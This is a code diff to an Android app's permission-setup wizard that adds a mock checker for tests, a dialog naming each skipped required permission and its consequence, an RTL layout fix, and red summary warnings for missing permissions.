@@ -19,6 +19,7 @@ import androidx.compose.foundation.layout.width
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.verticalScroll
+import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.Button
 import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.CircularProgressIndicator
@@ -72,7 +73,11 @@ class MainActivity : ComponentActivity() {
         }
 
         val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
-        val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
+        val checker: PermissionChecker = when {
+            !mockPerms -> SystemPermissionChecker()
+            intent.getBooleanExtra(EXTRA_DENY_GATES, false) -> GateDeniedChecker
+            else -> GreenChecker
+        }
         val opener: PermissionOpener = SystemPermissionOpener()
         // Injected transport: the only network-shaped seam in the app.
         val api: RegistrationApi =
@@ -134,6 +139,8 @@ class MainActivity : ComponentActivity() {
             .setCancelable(false)
             .create()
         dlg.show()
+        // Arabic notice on LTR devices: force RTL so the arrows read correctly.
+        dlg.window?.decorView?.layoutDirection = android.view.View.LAYOUT_DIRECTION_RTL
     }
 
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
@@ -184,6 +191,7 @@ class MainActivity : ComponentActivity() {
     companion object {
         const val EXTRA_MOCK_PERMS = "mock_perms"
         const val EXTRA_ENROLL_TOKEN = "enroll_token"
+        const val EXTRA_DENY_GATES = "mock_deny_gates"
         const val VEIL_MS = 2000L
     }
 }
@@ -192,6 +200,12 @@ class MainActivity : ComponentActivity() {
 object GreenChecker : PermissionChecker {
     override fun states(ctx: Context): Map<PermKey, Boolean> =
         PermKey.entries.associateWith { true }
+}
+
+/** All-green except the four gate keys — exercises the skip-confirm dialog. */
+object GateDeniedChecker : PermissionChecker {
+    override fun states(ctx: Context): Map<PermKey, Boolean> =
+        PermKey.entries.associateWith { it !in PermKey.GATE_KEYS }
 }
 
 @Composable
@@ -421,11 +435,12 @@ fun WizardScreen(
                         }
                     }
                     val allGranted = section.keys.all { sectionStates[it] == true }
+                    fun advanceSection() {
+                        if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
+                    }
                     // All-granted transition auto-advances; already-granted does not.
                     LaunchedEffect(allGranted) {
-                        if (allGranted && !prevAllGranted) {
-                            if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
-                        }
+                        if (allGranted && !prevAllGranted) advanceSection()
                         prevAllGranted = allGranted
                     }
                     Text(section.icon, fontSize = 44.sp, modifier = Modifier.padding(top = 24.dp))
@@ -477,13 +492,61 @@ fun WizardScreen(
                             }
                         }
                     }
+                    // Gate sections: skip must name each missing required
+                    // permission and its consequence before the user confirms.
+                    val missingGates = section.keys.filter { it.required && sectionStates[it] != true }
+                    var showGateDialog by remember(permIdx) { mutableStateOf(false) }
                     Row(Modifier.padding(top = 20.dp)) {
                         TextButton(
                             onClick = {
-                                if (permIdx < PERM_SECTIONS.lastIndex) permIdx++ else step = Step.SUMMARY
+                                if (missingGates.isNotEmpty()) showGateDialog = true
+                                else advanceSection()
                             },
                             modifier = Modifier.testTag("perm_skip")
                         ) { Text(stringResource(R.string.btn_skip)) }
+                        if (missingGates.isNotEmpty()) {
+                            Text(
+                                stringResource(R.string.missing_gate_count, missingGates.size),
+                                fontSize = 12.sp,
+                                color = RED,
+                                modifier = Modifier
+                                    .align(Alignment.CenterVertically)
+                                    .testTag("missing_gate_count")
+                            )
+                        }
+                    }
+                    if (showGateDialog) {
+                        AlertDialog(
+                            onDismissRequest = { showGateDialog = false },
+                            title = { Text(stringResource(R.string.gate_skip_title)) },
+                            text = {
+                                Column {
+                                    missingGates.forEach { g ->
+                                        Text(
+                                            stringResource(g.titleRes) + " — " +
+                                                stringResource(g.gateImpactRes),
+                                            fontSize = 14.sp,
+                                            modifier = Modifier.padding(top = 6.dp)
+                                        )
+                                    }
+                                }
+                            },
+                            confirmButton = {
+                                TextButton(
+                                    onClick = {
+                                        showGateDialog = false
+                                        advanceSection()
+                                    },
+                                    modifier = Modifier.testTag("gate_skip_confirm")
+                                ) { Text(stringResource(R.string.btn_skip_risky)) }
+                            },
+                            dismissButton = {
+                                TextButton(
+                                    onClick = { showGateDialog = false },
+                                    modifier = Modifier.testTag("gate_skip_back")
+                                ) { Text(stringResource(R.string.btn_back)) }
+                            }
+                        )
                     }
                 }
 
@@ -502,6 +565,18 @@ fun WizardScreen(
                             )
                         )
                     )
+                    // Missing gates surface in red with their consequence.
+                    val summaryStates = checker.states(LocalContext.current)
+                    PermKey.GATE_KEYS.filter { summaryStates[it] != true }.forEach { g ->
+                        Text(
+                            stringResource(g.titleRes) + " — " + stringResource(g.gateImpactRes),
+                            fontSize = 13.sp,
+                            color = RED,
+                            modifier = Modifier
+                                .padding(top = 4.dp)
+                                .testTag("summary_missing_gate_${g.name}")
+                        )
+                    }
                     var finishing by remember { mutableStateOf(false) }
                     var enrollError by remember { mutableStateOf<String?>(null) }
                     var retryTick by remember { mutableStateOf(0) }
